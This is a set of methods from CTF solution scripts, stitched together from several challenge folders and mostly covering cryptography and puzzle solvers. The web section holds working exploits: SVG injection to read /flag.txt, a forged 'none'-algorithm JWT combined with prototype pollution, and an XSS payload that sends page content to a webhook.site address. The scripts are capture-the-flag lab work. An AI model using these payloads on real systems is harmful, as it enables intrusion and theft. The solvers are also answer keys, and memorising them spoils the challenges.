        headers = {"Content-Type": "application/json"}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and "result" in response.json():
            self.meme = response.json()["result"]
            self.meme_url = f"http://{self.url}:{self.port}/{self.meme}"
            print(self.meme_url)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def downloading(self):
        if not hasattr(self, "meme_url"):
            print("Meme not generated. Please run the generating step first.")
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split("/")[-1]
        if response.status_code == 200:
            with open(self.folfil("data", meme_name), "wb") as f:
                f.write(response.content)
            print("Meme downloaded successfully.")
        else:
            print("Failed to download the meme.")

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def main(self):
        self.new_url = f"http://{self.url}:{self.port}/api/generate"
        self.generating()

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def generating(self):

        # exploit = """M</text><image x="0" y="250" width="500" height="250" href="file:///app/flag.txt"/><text x="50%" y="45" font-size="40" fill="blue" stroke="red">A"""

        # filename = "static/memes/doge.png"

        # exploit = f"""M</text><image x="10" y="0" width="50" height="50" href="file://{filename}"/><text x="50%" y="45" font-size="40" fill="blue" stroke="red">A"""

        online_meme_url = f"http://{self.url}:{self.port}/memes/doge"

        # exploit = f"""M</text><image x="0" y="0" width="500" height="250" href="{online_meme_url}"/><text x="50%" y="45" font-size="40" fill="red" stroke="red">A"""

        # filename = "/flag.txt"
        # filename = base64.b64encode(filename.encode()).decode()
        # data:image/png;base64,
        # exploit = f"""M</text><g id="foreground"><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/></g><text x="50%" y="45"  fill="blue" stroke="red">A"""
        # exploit = f"""M</text><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/><text x="50%" y="45"  fill="blue" stroke="red">A"""
        # exploit = f"""M</text><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/><text y="45">A"""

        filename = "/flag.txt"

        # exploit = f"""</text><foreignObject><iframe  src="file://{filename}"/></foreignObject><text y="45">A"""
        exploit = f"""</text><foreignObject><iframe  src="{online_meme_url}"/></foreignObject><text y="45">A"""

        # exploit = f"""M</text><g id="foreground"><image x="0" y="0" width="50" height="50" href="data:image/png;base64,{filename}"/></g><text x="50%" y="45"  fill="blue" stroke="red">A"""

        print(len(exploit))
        print(exploit)

        payload = {
            "name": "everywhere",
            # "name": "doge",
            "topText": "lol",
            "bottomText": exploit,
        }

        headers = {"Content-Type": "application/json"}

        response = requests.post(self.new_url, json=payload, headers=headers)

        if response.status_code == 200 and "result" in response.json():
            self.meme = response.json()["result"]
            self.meme_url = f"http://{self.url}:{self.port}/{self.meme}"
            print(self.meme_url)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/attempt_01.py
    def downloading(self):
        if not hasattr(self, "meme_url"):
            print("Meme not generated. Please run the generating step first.")
            return
        response = requests.get(self.meme_url)
        meme_name = self.meme.split("/")[-1]
        if response.status_code == 200:
            with open(self.folfil("data", meme_name), "wb") as f:
                f.write(response.content)
            print("Meme downloaded successfully.")
        else:
            print("Failed to download the meme.")

	# /home/figaro/CTF/Categories/Web/ECSC/Popcorn_and_Payloads/payloads/solution.py
    def main(self):
        self.completed_url = f"http://{self.url}:{self.port}"

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def create_token(self, username):
        header = {"alg": "none", "typ": "JWT"}
        return jwt.encode(
            {"username": username}, key=None, algorithm="none", headers=header
        )

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def pollute(self, base_url):
        payload = {
            "user.username": "nikolas",
            "user.password": "nikolas",
            "user.__proto__.payloads": ["none"],
            "user.__proto__.authKeyFile": True,
        }
        r = requests.post(f"{base_url}/api/register", json=payload)

	# /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def main(self):
        self.base_url = f"http://{self.url}:{self.port}"
        cookie = self.create_token("admin")
        headers = {"Cookie": f"session={cookie}"}
        print(cookie)
        self.pollute(self.base_url)
        req = requests.get(f"{self.base_url}/panel", headers=headers)
        flag = self.re_match_partial_flag(text=req.text, origin="ECSC")
        print(flag)

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_payload(self, attacker_url):
        payload = """
        <script>
        const iframe = document.createElement('iframe');
        iframe.srcdoc = `
        <script>
        window.parent.postMessage({
            style: {
            "webkitUserModify": "read-write"
            }
        }, '*');
        <\\/script>
    `;
        document.body.appendChild(iframe);

        setTimeout(() => {
            window.find('Here');
            document.execCommand('insertHTML', false, `<img src=x onerror="fetch('EXFIL_URL'+this.parentElement.outerHTML)">`)
        }, 1000);
        </script>
        """.replace(
            "EXFIL_URL", attacker_url
        )

        return payload

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_url(self, attacker_url, payload):
        """
        Description:
            Generate a URL with the given attacker URL and payload.

        Args:
            attacker_url (_type_): _description_
            payload (_type_): _description_

        Returns:
            _type_: _description_
        """
        base_url = "http://localhost/index.php"

        parsed_url = urllib.parse.quote(payload)
        print(parsed_url)
        params_suffix = "&p=1" * 1500
        return f"{base_url}?xss={parsed_url}{params_suffix}"

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def send_to_bot(self, payload_url):
        """
        Description:
            Send the payload URL to the bot.

        Args:
            payload_url (_type_): _description_

        Returns:
            _type_: _description_
        """
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"url": payload_url}
        response = requests.post(self.bot_url, headers=headers, data=data)
        return response.text

	# /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def main(self):
        self.url_ful = f"http://{self.url}:{self.port}"
        self.base_url = f"{self.url_ful}/index.php"
        self.bot_url = f"{self.url_ful}/bot.php"

        attacker_url = "https://webhook.site/73ea9e99-e3cc-4b42-a040-4c7c107406b6?leak="
        payload = self.generate_payload(attacker_url)
        payload_url = self.generate_url(attacker_url, payload)
        response = self.send_to_bot(payload_url)
        print(response)

	# /home/figaro/CTF/Categories/General/picoCTF/SansAlpha/payloads/solution.py
    def main(self):
        user = "ctf-player"
        host = "mimas.picoctf.net"
        port = 50399
        password = "6dd28e9b"

        self.conn = self.pwn.ssh(user, host, port, password)

        # print(repr(self.conn("ls")))
        self.conn.interactive("/bin/sh")

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def main(self):
        self.password = "8a707622"
        self.user = "ctf-player"
        self.host = "saturn.picoctf.net"
        self.port = 54157

        self.ssh_connect(
            user=self.user, host=self.host, port=self.port, password=self.password
        )
        self.interactive()

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def ssh_connect(self, **kwargs):
        """
        Descrption : Establish SSH connection
        Parameters :
            - user : username
            - host : hostname
            - port : port number
            - password : password

        Returns : None
        """
        user = kwargs.get("user", self.user)
        host = kwargs.get("host", self.host)
        port = kwargs.get("port", self.port)
        password = kwargs.get("password", self.password)

        if any([user is None, host is None, port is None, password is None]):
            raise "Invalid SSH connection parameters"
            return

        self.ssh_connection = self.pwn.ssh(user, host, port, password)

	# /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def interactive(self):
        """
        Descrption : Start an interactive session
        Parameters : None
        Returns : None
        """
        self.ssh_connection.interactive()

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def from_hex(self, hex_string):
        return bytes.fromhex(hex_string).decode("utf-8")

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def hex_to_string(self, hex_string):
        """
        Description: Convert hex string to ascii string

        Analytical:
        - Split the hex string by space
        - Convert each hex value to ascii character
        - Join the ascii characters to form the ascii string

        Args:
            hex_string (str): Hex string to convert to ascii

        Returns:
            str: Ascii string
        """
        hex_string = hex_string.split(" ")
        return "".join([chr(int(i, 16)) for i in hex_string])

	# /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            data = f.read().strip()

        flag = self.hex_to_string(data)

        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def main(self):
        dictionary = self.Path(self.folder_files, "dictionary.txt")
        with open(dictionary, "r") as f:
            self.pos_pw_list = f.read().splitlines()
        file_hash = self.Path(self.folder_files, "level5.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def main(self):
        self.pos_pw_list = ["8799", "d3ab", "1ea2", "acaf", "2295", "a9de", "6f3d"]
        file_hash = self.Path(self.folder_files, "level3.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) < len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return "".join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

	# /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def main(self):
        self.pos_pw_list = [
            "158f",
            "1655",
            "d21e",
            "4966",
            "ed69",
            "1010",
            "dded",
            "844c",
            "40ab",
            "a948",
            "156c",
            "ab7f",
            "4a5f",
            "e38c",
            "ba12",
            "f7fd",
            "d780",
            "4f4d",
            "5ba1",
            "96c5",
            "55b9",
            "8a67",
            "d32b",
            "aa7a",
            "514b",
            "e4e1",
            "1230",
            "cd19",
            "d6dd",
            "b01f",
            "fd2f",
            "7587",
            "86c2",
            "d7b8",
            "55a2",
            "b77c",
            "7ffe",
            "4420",
            "e0ee",
            "d8fb",
            "d748",
            "b0fe",
            "2a37",
            "a638",
            "52db",
            "51b7",
            "5526",
            "40ed",
            "5356",
            "6ad4",
            "2ddd",
            "177d",
            "84ae",
            "cf88",
            "97a3",
            "17ad",
            "7124",
            "eff2",
            "e373",
            "c974",
            "7689",
            "b8b2",
            "e899",
            "d042",
            "47d9",
            "cca9",
            "ab2a",
            "de77",
            "4654",
            "9ecb",
            "ab6e",
            "bb8e",
            "b76b",
            "d661",
            "63f8",
            "7095",
            "567e",
            "b837",
            "2b80",
            "ad4f",
            "c514",
            "ffa4",
            "fc37",
            "7254",
            "b48b",
            "d38b",
            "a02b",
            "ec6c",
            "eacc",
            "8b70",
            "b03e",
            "1b36",
            "81ff",
            "77e4",
            "dbe6",
            "59d9",
            "fd6a",
            "5653",
            "8b95",
            "d0e5",
        ]

        file_hash = self.Path(self.folder_files, "level4.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def parse_csr(self):
        with open(self.challenge_file, "rb") as f:
            csr_data = f.read()

        csr = crypto.load_certificate_request(crypto.FILETYPE_PEM, csr_data)
        # Print the parsed CSR
        for i in range(csr.get_subject().get_components().__len__()):
            print(csr.get_subject().get_components()[i])

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def main(self):
        self.parse_csr()

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            enc_flag_data = f.read().strip().split("\n")

        a = enc_flag_data[0].split(" = ")[1]
        b = enc_flag_data[1].split(" = ")[1]
        cipher = enc_flag_data[2].split(": ")[1].strip("[]").split(", ")
        a = int(a)
        b = int(b)
        cipher = [int(c) for c in cipher]

        p = self.finding_next_prime(a)
        g = self.finding_next_prime(b)

        u = self.generator(g, a, p)
        v = self.generator(g, b, p)

        key = self.generator(v, a, p)
        b_key = self.generator(u, b, p)
        if key == b_key:
            shared_key = key

        # print(shared_key)
        semi_plaintext = self.decrypt(cipher, shared_key)
        tex_key = "trudeau"

        flag = self.dynamic_xor_decrypt("".join(semi_plaintext), tex_key)
        flag = flag[::-1]
        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def generator(self, g, x, p):
        return pow(g, x) % p

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def is_prime(self, p):
        v = 0
        for i in range(2, p + 1):
            if p % i == 0:
                v = v + 1
        if v > 1:
            return False
        else:
            return True

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def finding_next_prime(self, number, n=None):
        if n:
            for _ in range(number, number + n):
                if self.is_prime(number):
                    return number
        else:
            while True:
                number = number + 1
                if self.is_prime(number):
                    return number

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_encrypt(self, plaintext, text_key):
        cipher_text = ""
        key_length = len(text_key)
        for i, char in enumerate(plaintext[::-1]):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_decrypt(self, plaintext, text_key):
        cipher_text = ""
        key_length = len(text_key)
        for i, char in enumerate(plaintext):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def encrypt(self, plaintext, key):
        cipher = []
        for char in plaintext:
            cipher.append(((ord(char) * key * 311)))
        return cipher

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def decrypt(self, cipher_list, key):
        plaintext = []
        for char in cipher_list:
            plaintext.append(chr(int(char / key / 311)))
        return plaintext

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def get_message(self):
        with open(self.challenge_file, "r") as f:
            self.message_data = f.read().strip()

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def context(self, number):
        if 0 <= number <= 25:
            # Uppercase
            return chr(ord("A") + number)
        elif 26 <= number <= 35:
            # Numbers
            return chr(ord("0") + number - 26)
        elif number == 36:
            return "_"
        else:
            return str(number)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def main(self):
        self.get_message()

        flag = [self.context(int(i) % 37) for i in self.message_data.split(" ")]

        flag = "".join(flag)

        flag = "picoCTF{" + flag + "}"

        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.passwords_source = b64decode(
            b"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9QYXNzd29yZHMvQ29tbW9uLUNyZWRlbnRpYWxzLzEway1tb3N0LWNvbW1vbi50eHQ="
        ).decode()

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def get_online_passwords(self):
        r = requests.get(self.passwords_source)
        self.password_list = r.text.split("\n")

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def decrypting_vigenere(self, ciphertext, key):
        key = key.lower()
        plaintext = ""
        for i, ch in enumerate(ciphertext):
            if ch.isalpha():
                nch = ord(ch) - 97
                nk = ord(key[i % len(key)]) - 97
                plaintext += chr((nch - nk + 26) % 26 + 97)
            else:
                plaintext += ch
        return plaintext

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def brute_force(
        self,
        ciphertext,
        password_list,
        cleartext: str = None,
        verbose: bool = False,
        tryall=False,
    ):

        for i, password in enumerate(password_list):
            if password.strip() == "":
                continue

            if verbose:
                if i % 100 == 0:
                    print(f"Trying password {i+1}/{len(password_list)}: {password}")

            decrypted = ciphertext
            for _ in range(2):

                decrypted = self.decrypting_vigenere(decrypted, password)

            if cleartext is not None:
                if cleartext in decrypted:
                    if verbose:
                        print(f"Found password: {password}")
                        print(f"Decrypted text: {decrypted}")
                    if not tryall:
                        return password, decrypted
            else:
                if decrypted.isprintable() and len(decrypted) > 10:
                    if verbose:
                        print(f"Found valid password: {password}")
                        print(f"Decrypted text: {decrypted}")
                    # return password, decrypted

        if verbose:
            print("No valid password found.")
        return None, None

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def main(self):

        with open(self.challenge_file, "r") as f:
            ciphertext = f.read().strip()

        self.get_online_passwords()
        print("Starting brute force...")

        password, decrypted_text = self.brute_force(
            ciphertext,
            password_list=self.password_list,
            cleartext="htb",
            verbose=True,
            tryall=True,
        )

	# /home/figaro/CTF/Categories/Cryptography/CSCG/Insecure/payloads/solution.py
    def main(self):
        e = 65537
        n = 1034776851837418228051242693253376923
        c = 1006234941664191676977296641660749407

        # from factordb.com
        p = 1086027579223696553
        q = 952809000096560291

        # Calculations start here
        phi = (p - 1) * (q - 1)

        d = inverse(e, phi)

        decrypted_m = pow(c, d, n)
        # print(decrypted_m)
        print("csc{" + str(decrypted_m) + "}")

	# /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def main(self):

        # Known plaintext
        test = b"Capybara friends, mission accomplished! We've caused a blackout, let's meet at the bar to celebrate!"

        # Parse from output file
        with open(self.folfil("files", "output.txt"), "r") as f:
            contents = f.read().split("\n")

        test_dt, test_ts, test_cipher = contents[0].split(" ")
        test_cipher = bytes.fromhex(test_cipher)

        flag_dt, flag_ts, flag_cipher = contents[1].split(" ")
        flag_cipher = bytes.fromhex(flag_cipher)

        # Get test cipher and flag cipher timestamp hashes

        test_ts = int(
            (
                cal.timegm(t.strptime(test_dt + " " + test_ts, "%Y-%m-%d %H:%M:%S.%f"))
                + float("." + test_ts.split(".")[1])
            )
            * 1000
        ).to_bytes(16, byteorder="big")
        test_ts = md5(test_ts).digest()

        flag_ts = int(
            (
                cal.timegm(t.strptime(flag_dt + " " + flag_ts, "%Y-%m-%d %H:%M:%S.%f"))
                + float("." + flag_ts.split(".")[1])
            )
            * 1000
        ).to_bytes(16, byteorder="big")
        flag_ts = md5(flag_ts).digest()

        # Divide ciphers into blocks
        test_blocks = [test_cipher[i : i + 16] for i in range(0, len(test_cipher), 16)]
        flag_blocks = [flag_cipher[i : i + 16] for i in range(0, len(flag_cipher), 16)]

        # Reverse the xor by timestamp
        test_dexored = b""
        for block in test_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, test_ts))
            test_dexored += block_with_xor

        flag_dexored = b""
        for block in flag_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, flag_ts))
            flag_dexored += block_with_xor

        # Extract key from known plaintext
        key = bytes(a ^ b for a, b in zip(test, test_dexored))

        # Decrypt flag
        flag = bytes(a ^ b for a, b in zip(key, flag_dexored))

        print(key)
        print(flag)

        # The XOR of two ciphertexts (output from your previous step)
        # cipher_xor = b"~I\x9c\x9a\xdd\x83\xe2\x9e\xd4@\x18\x84\xbd~\xec B\xf67\xbf..."

        cipher_xor = flag

        # Known part of the flag (assuming it's at the beginning)
        known_flag = b"FLG"

        # XOR the known flag with the first bytes of the ciphertext XOR result
        keystream_guess = self.xor_bytes(cipher_xor[: len(known_flag)], known_flag)

        # Use the guessed keystream to decrypt more of one plaintext
        possible_plaintext = self.xor_bytes(
            cipher_xor, keystream_guess * (len(cipher_xor) // len(keystream_guess) + 1)
        )

        print("Recovered plaintext guess:", possible_plaintext.decode(errors="ignore"))

	# /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def solve(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def main(self):

        conn_1 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        conn_2 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        # For the local connection, we need to edit the server.py file
        conn_1.challenge_file = self.Path(self.folders["data"], "edited_server.py")
        conn_2.challenge_file = self.Path(self.folders["data"], "edited_server.py")

        # Initialize the connection on both
        conn_1.initiate_connection()
        conn_2.initiate_connection()

        conn_1.recv_send(text_until="> ", text="1")
        encflag = conn_1.recv_lines(1, save=True)[0].decode().strip()
        encflag = bytes.fromhex(encflag)

        conn_2.recv_send(text_until="> ", text="2")
        conn_2.recv_send(text_until=": ", text="00" * len(encflag))

        xor_with_this = conn_2.recv_lines(1, save=True)[0].decode().strip()

        xor_with_this = bytes.fromhex(xor_with_this)

        print(self.pwn.xor(xor_with_this, encflag))

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def xor(self, a, b):
        return bytes(
            [a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))]
        )

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def open_file(self):
        with open(self.challenge_file, "r") as f:
            data = f.read().split("\n")
            n = int(data[0].split("= ")[1])
            enc_flag = data[1].split("= ")[1]
            c = data[2].split("= ")[1]
        return n, enc_flag, c

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def main(self):

        n, enc_flag, c = self.open_file()

        m = b"1337"

        c_rsa = pow(bytes_to_long(m), 3, n)

        otp = self.xor(long_to_bytes(c_rsa), bytes.fromhex(c))

        rsa_flag = self.xor(bytes.fromhex(enc_flag), otp)[:-5]

        m, _ = iroot(bytes_to_long(rsa_flag), 3)
        m = long_to_bytes(m)
        print(m)

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def main(self):
        self.key = ""
        key_pub = self.Path(self.folder_files, "key.pub")
        with open(key_pub, "r") as f:
            self.key = RSA.importKey(f.read())
        self.n = self.key.n
        self.e = self.key.e

        self.crypted = b"Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l"

        self.msg = bytes_to_long(b64decode(self.crypted))

        cleartext = self.find_invpow(self.msg, 3)
        cleartext = long_to_bytes(int(cleartext))

        print(cleartext)

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def find_invpow(self, x, n):
        """Finds the integer component of the n'th root of x,
        an integer such that y ** n <= x < (y + 1) ** n.
        """
        high = 1
        while high**n < x:
            high *= 2
        low = high // 2
        while low < high:
            mid = (low + high) // 2
            if low < mid and mid**n < x:
                low = mid
            elif high > mid and mid**n > x:
                high = mid
            else:
                return mid
        return mid + 1

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def md5_hash(self, s):
        return md5(s.encode()).hexdigest()

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def find_collision(
        self, target_hash, max_length=10, prefix="", suffix="", lengthy=False
    ):
        # Define the character set to use for generating combinations
        charset = (
            string.ascii_letters + string.digits
        )  # You can add special characters if needed

        if lengthy:
            for length in range(1, max_length + 1):
                for combination in itertools.product(charset, repeat=length):
                    candidate = prefix + "".join(combination) + suffix
                    print(candidate, self.md5_hash(candidate), self.target_hash)

                    if self.md5_hash(candidate) == target_hash:
                        return candidate
        else:
            # Iterate over lengths from 1 to max_length
            for combination in itertools.product(
                charset, repeat=max_length - len(prefix) - len(suffix)
            ):
                candidate = prefix + "".join(combination) + suffix
                print(candidate, self.md5_hash(candidate), self.target_hash)
                if self.md5_hash(candidate) == target_hash:
                    return candidate
        return None

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def bruteforce(self):
        self.users = {
            "HTBUser132": [md5(b"HTBUser132").hexdigest(), "secure123!"],
            "JohnMarcus": [md5(b"JohnMarcus").hexdigest(), "0123456789"],
        }

        # The target hash for "HTBUser 132"
        self.target_hash = self.md5_hash("HTBUser132")

        self.collision = self.find_collision(
            self.target_hash,
            max_length=len("HTBUser132"),
            prefix="",
            suffix="",
            lengthy=True,
        )
        print(
            f"Found collision: {self.collision} with hash: {self.md5_hash(self.collision)}"
        )

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def known_colissions(self):
        one = {
            "username": "TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak",
            "password": "verysecure",
        }
        two = {
            "username": "TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak",
            "password": "verysecure",
        }

        print(f"Hash one: {self.md5_hash(one['username'])}")
        print(f"Hash two: {self.md5_hash(two['username'])}")

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def main(self):
        # self.bruteforce()
        self.known_colissions()

	# /home/figaro/CTF/Categories/Cryptography/HTB/MuTLock/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.v1 = 4196604293528562019178729176959696479940189487937638820300425092623669070870963842968690664766177268414970591786532318240478088400508536
        self.v2 = 11553755018372917030893247277947844502733193007054515695939193023629350385471097895533448484666684220755712537476486600303519342608532236
        self.v3 = 14943875659428467087081841480998474044007665197104764079769879270204055794811591927815227928936527971132575961879124968229204795457570030
        self.v4 = 6336816260107995932250378492551290960420748628

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def solve_equations(self):
        self.cnd1, self.cnd2, self.cnd3 = symbols("cnd1 cnd2 cnd3")

        # Define the equations
        eq1 = Eq(self.cnd1**3 + self.cnd3**2 + self.cnd2, self.v1)
        eq2 = Eq(self.cnd2**3 + self.cnd1**2 + self.cnd3, self.v2)
        eq3 = Eq(self.cnd3**3 + self.cnd2**2 + self.cnd1, self.v3)
